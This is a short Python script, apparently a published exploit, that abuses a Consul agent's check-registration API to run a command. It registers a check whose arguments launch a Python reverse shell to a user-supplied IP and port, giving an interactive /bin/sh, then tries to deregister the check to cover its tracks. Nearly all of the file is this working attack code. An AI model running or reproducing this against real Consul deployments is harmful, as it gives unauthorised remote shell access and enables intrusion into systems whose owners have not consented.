uthor: adan.alvarez.90@gmail.com
# Description:
#    - Creates a new check in Consul agent to obtain a reverse shell.

import requests
import sys
import argparse
import time
import json

if len(sys.argv) <= 1:
	print('[*] Script to create a new check in Consul agent to obtain a reverse shell')
	print('\n%s -h for help.' % (sys.argv[0]))
	exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
					dest="url",
					help="Consul URL",
					action='store')
parser.add_argument("-p", "--port",
					dest="port",
					help="Port for the reverse shell",
					action='store')
parser.add_argument("-i", "--ip",
					dest="ip",
					help="IP for the reverse shell",
					action='store')

args = parser.parse_args()
url = args.url if args.url else None
ip = args.ip if args.ip else None
port = args.port if args.port else None
python='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"]);'.format(ip, port)
data = {'ID': 'rc', 'Name': 'Remote code execution', 'Shell': '/bin/bash', 'Interval': '5s'}
data['Args']=['python', '-c', python]
registerurl=url+"/v1/agent/check/register"
r = requests.put(registerurl, json=data)
time.sleep(5)

desregisterurl=url+"/v1/agent/service/deregister/rc"
r = requests.put(desregisterurl)
